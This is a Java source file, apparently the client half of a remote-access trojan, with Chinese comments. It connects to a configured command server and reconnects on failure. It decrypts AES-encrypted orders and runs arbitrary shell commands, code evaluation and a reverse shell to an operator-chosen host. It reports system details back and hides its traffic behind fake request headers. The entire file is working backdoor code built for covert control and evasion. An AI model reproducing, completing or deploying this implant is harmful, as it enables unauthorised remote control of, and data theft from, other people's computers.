package socks;


import encryption.AESOperator;
import property.Property;
import exec.Call;

import java.io.*;
import java.net.Socket;
import java.util.UUID;

/**
 * 客户端
 */
public class Client {
    public void run() {
        //启动成功，客户端生成唯一标识
        String id = UUID.randomUUID().toString();
        System.out.println("生成ID：".concat(id));

        Call ca = new Call();
        c:while (true) {
            String host = Property.host;
            int port = Property.port;
            Socket socket;
            try {
                socket = new Socket(host, port);
            } catch (IOException e) {
                //如果服务端断开，每10秒重新连接一次。
                System.out.println("找不到服务器，" + Property.reConnectTime/1000 + "秒后自动重新连接...");
                try {
                    Thread.sleep(Property.reConnectTime);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
                continue;
            }

            BufferedWriter os = null;
            BufferedReader is = null;
            try {
                //由Socket对象得到输出流，并构造PrintWriter对象
                os = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                //由Socket对象得到输入流，并构造相应的BufferedReader对象
                is = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            } catch (IOException e) {
                //e.printStackTrace();
                System.out.println("创建流对象异常！");
            }

            try {
                //跳过伪装流量
                while (!"QQ-S-ZIP: gzip".equals(is.readLine())){
                }is.readLine();
                String recv = is.readLine();
                //数据解密
                try {
                    recv = AESOperator.getInstance().decrypt(recv);
                } catch (Exception e) {
                    System.err.println("解密过程异常！");
                }

                String[] recvs = recv.split("#!#:#!#");
                String type = recvs[0];
                System.out.println("收到类型:" + type);

                String cmd = "";
                if(recvs.length > 1){
                    cmd = recvs[1];
                    System.out.println("收到指令:" + cmd);
                }

                //向远端发送数据
                String data = "";
                if(type.equals("\\getInitInfo")){
                    data = "目标系统版本：".concat(System.getProperty("os.name").concat("\r\n目标ID：").concat(id));
                } else if(type.equals("disconnect")){
                    if(cmd.equals("-1")){
                        System.out.println("shutdown");
                        break c;
                    }
                    Thread.sleep(1000 * Integer.parseInt(cmd));
                } else if (type.equals("cmd")) {
                    if(cmd == null || cmd.trim().equals("")){
                        System.out.println("cmd为空");
                    }else{
                        data = ca.execmd(cmd);
                    }
                } else if (type.equals("rshell")) {
                    String[] rShells = cmd.split(":");
                    if(cmd.indexOf(":") < 0){
                        rShells = cmd.split(" ");
                    }
                    String rShellHost = rShells[0];
                    int rShellPort = Integer.parseInt(rShells[1]);
                    System.out.println("执行反弹shell：" + rShellHost.concat(":") + rShellPort);
                    ca.rShell(rShellHost, rShellPort);
                    data = "已执行反弹shell，目标系统版本：".concat(System.getProperty("os.name"));
                } else if (type.equals("eval")) {
                    if(cmd == null || cmd.trim().equals("")){
                        System.out.println("cmd为空");
                    }else{
                        data = ca.eval(cmd);
                    }
                }

                //数据加密
                try {
                    data = AESOperator.getInstance().encrypt(data);
                } catch (Exception e) {
                    System.out.println("加密过程导致异常！");
                }

                //伪装流量
                BufferedReader in = new BufferedReader(new InputStreamReader(Property.class.getResourceAsStream("/conf/boxRequest.context")));
                String requestHeaders = "";
                String tmpStr;
                while ((tmpStr = in.readLine()) != null) {
                    requestHeaders += tmpStr + "\r\n";
                }
                requestHeaders = requestHeaders.substring(0,requestHeaders.lastIndexOf("\r\n"));
                in.close();
                data = requestHeaders.concat(data);

                os.write(data);
                os.newLine();
                os.flush();
                os.close();
                is.close();
                socket.close();
            } catch (IOException e) {
                System.err.println("读写远端数据时发生异常！");
            } catch (Exception e1) {
                e1.printStackTrace();
                System.err.println("未知异常！");
            }
        }

    }

}
